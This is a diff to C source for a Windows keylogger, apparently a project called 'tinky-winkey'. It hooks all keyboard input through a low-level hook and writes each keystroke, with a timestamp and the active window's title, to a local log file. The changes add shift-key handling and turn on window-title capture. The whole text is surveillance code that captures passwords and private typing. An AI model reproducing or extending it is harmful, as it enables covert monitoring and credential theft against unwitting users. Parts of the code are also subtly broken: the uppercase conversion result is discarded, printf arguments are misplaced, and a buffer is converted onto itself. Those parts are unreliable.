@@ -20,7 +20,7 @@ void    getKeysState(bool *capsLock, bool *shift) {
         // Getting the state of the keys in order to know if they are pressed or not.    
     */
     *capsLock = GetKeyState(VK_CAPITAL) & 0x0001;
-    *shift = GetAsyncKeyState(VK_SHIFT) & 0x0001;
+    *shift = GetAsyncKeyState(VK_LSHIFT) & 0x0001;
 }
 
 void    handleSpecial(int vkCode, char *key_pressed) {
@@ -47,6 +47,10 @@ void    handleSpecial(int vkCode, char *key_pressed) {
         key_pressed = strdup("[LEFT CTRL]");
     else if (vkCode == VK_RCONTROL)
         key_pressed = strdup("[RIGHT CTRL]");
+    else if (vkCode == VK_LSHIFT)
+        key_pressed = strdup("[LEFT SHIFT]");
+    else if (vkCode == VK_RSHIFT)
+        key_pressed = strdup("[RIGHT SHIFT]");
 }
 LRESULT hookproc(int code, WPARAM wparam, LPARAM lparam) {
     /*
@@ -64,9 +68,13 @@ LRESULT hookproc(int code, WPARAM wparam, LPARAM lparam) {
 
     KBDLLHOOKSTRUCT const *info = (KBDLLHOOKSTRUCT const *)lparam;
 
-    if (info->flags & LLKHF_UP && info->vkCode != VK_CAPITAL 
-        || info->flags & LLKHF_UP && info->vkCode != VK_SHIFT)
+    // if (info->flags & LLKHF_UP && info->vkCode != VK_CAPITAL ) 
+        // return 0;
+
+        // don't track key release except for capslock and shift
+    if (info->flags & LLKHF_UP && info->vkCode != VK_CAPITAL && info->vkCode != VK_LSHIFT && info->vkCode != VK_RSHIFT)
         return 0;
+
 
     if (!(key_pressed = malloc(sizeof(char) * 4)))
         return 0;
@@ -98,9 +106,12 @@ LRESULT hookproc(int code, WPARAM wparam, LPARAM lparam) {
         WideCharToMultiByte(CP_UTF8, 0, buf, -1, key_pressed, 4, NULL, NULL);
         if (info->vkCode == VK_SPACE || info->vkCode == VK_RETURN || info->vkCode == VK_BACK 
             || info->vkCode == VK_TAB || info->vkCode == VK_ESCAPE || info->vkCode == VK_LCONTROL
-            || info->vkCode == VK_RCONTROL || info->vkCode == VK_LSHIFT || info->vkCode == VK_RSHIFT)
+            || info->vkCode == VK_RCONTROL || info->vkCode == VK_LSHIFT || info->vkCode == VK_RSHIFT 
+            || info->vkCode == VK_CAPITAL)
             handleSpecial(info->vkCode, key_pressed);
 
+        // printf("capsLock: %d\n", capsLock);
+        // printf("shift: %d\n", shift);
         if (capsLock && !shift || !capsLock && shift)
             toupper(key_pressed[0]);
         else if (capsLock && shift || !capsLock && !shift)
@@ -109,10 +120,12 @@ LRESULT hookproc(int code, WPARAM wparam, LPARAM lparam) {
         GetLocalTime(&st);
         sprintf(timestamp, "%02d:%02d:%02d.%03d", st.wHour, st.wMinute, st.wSecond, st.wMilliseconds);
         hwnd = GetForegroundWindow();
-        // GetWindowTextA(hwnd, title, 256); // ici // oki merci
+        GetWindowTextA(hwnd, title, 256); // ici // oki merci
 
-        GetWindowTxtW(hwnd, title, 256);
+        // GetWindowTextW(hwnd, title, 256);
+        WideCharToMultiByte(CP_UTF8, 0, title, -1, title, 256, NULL, NULL);
         sprintf(output, "[%s] <%s> => %s\n", timestamp, title, key_pressed);
+        // printf("%s", output);
         fwrite(output, 1, strlen(output), f);
         fflush(f);
     }
@@ -124,11 +137,11 @@ int main(void) {
     HINSTANCE hInstance = GetModuleHandleW(NULL);
 
     f = fopen("C:\\Users\\Buste\\Documents\\GitHub\\tinky-winkey\\log.txt", "w");
+    getKeysState(&capsLock, &shift);
     kbd_hook = SetWindowsHookExW(WH_KEYBOARD_LL, hookproc, hInstance, 0);
     if (!kbd_hook)
         return (printf("hook installation failed: %d\n", GetLastError(), 1));
 
     MSG msg;
-    getKeysState(&capsLock, &shift);
     GetMessageW(&msg, NULL, 0, 0);
 }
